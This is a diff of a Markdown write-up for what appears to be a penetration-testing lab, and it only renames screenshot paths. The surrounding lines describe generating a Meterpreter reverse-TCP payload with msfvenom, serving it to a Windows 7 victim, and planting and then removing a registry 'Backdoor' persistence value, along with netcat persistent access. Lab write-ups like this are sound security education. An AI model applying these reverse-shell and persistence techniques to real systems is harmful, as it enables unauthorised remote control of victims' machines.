@@ -285,7 +285,7 @@ msfvenom -p windows/meterpreter_reverse_tcp \
 - Saved to `/var/www/html/` so it can be served via the web server for the victim to download
 - `uname -a` confirms the attacker machine: Kali Linux 5.18.0 x86_64
 
-![msfvenom Payload Generation](Lab06/lab06-slide-1.jpg)
+![msfvenom Payload Generation](Lab06/1.jpg)
 
 ---
 
@@ -309,7 +309,7 @@ exploit
 - `dir` confirmed we are inside `C:\Users\User\Desktop\` on the Windows 7 target
 - `meterpreter > background` sent the session to background for further tasks
 
-![Metasploit Listener & Meterpreter Session](Lab06/lab06-slide-2.jpg)
+![Metasploit Listener & Meterpreter Session](Lab06/2.jpg)
 
 ---
 
@@ -356,7 +356,7 @@ msf6 exploit(multi/handler) > date && hostname
 - Session was killed (`sessions -k 1`) to simulate the victim restarting their machine
 - `date && hostname` confirmed attacker system info: `spokhrel157855`, Oct 21 2023
 
-![Registry Persistence Setup](Lab06/lab06-slide-4.jpg)
+![Registry Persistence Setup](Lab06/4.jpg)
 
 ---
 
@@ -373,7 +373,7 @@ msf6 exploit(multi/handler) > date && hostname
   - Full name: `spokhrel157855-W7`
   - Username: `User`
 
-![Registry Verification on Windows 7](Lab06/lab06-slide-5.jpg)
+![Registry Verification on Windows 7](Lab06/5.jpg)
 
 ---
 
@@ -399,7 +399,7 @@ meterpreter > reg deleteval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersio
 - `reg deleteval -v Backdoor` successfully removed the backdoor from the registry
 - Output: `Successfully deleted Backdoor.` — simulating post-pentest cleanup
 
-![Reconnection and Backdoor Removal](Lab06/lab06-slide-6.jpg)
+![Reconnection and Backdoor Removal](Lab06/6.jpg)
 
 ---
 
@@ -425,7 +425,7 @@ meterpreter > reg queryval -k HKLM\\Software\\Microsoft\\Windows\\CurrentVersion
   - Data: `1234`
 - Bottom terminal: `uname -a && date` shows Kali Linux attacker system timestamp: Oct 21 2023
 
-![Advanced Registry Manipulation](Lab06/lab06-slide-7.jpg)
+![Advanced Registry Manipulation](Lab06/7.jpg)
 
 ---
 
@@ -452,7 +452,7 @@ uname -a
 - Successfully exited and returned to Kali
 - Final `uname -a` confirms Kali Linux 5.18.0 attacker system: Oct 24 2023
 
-![Netcat Persistent Access](Lab06/lab068.jpg)
+![Netcat Persistent Access](Lab06/8.jpg)
 
 ---
 
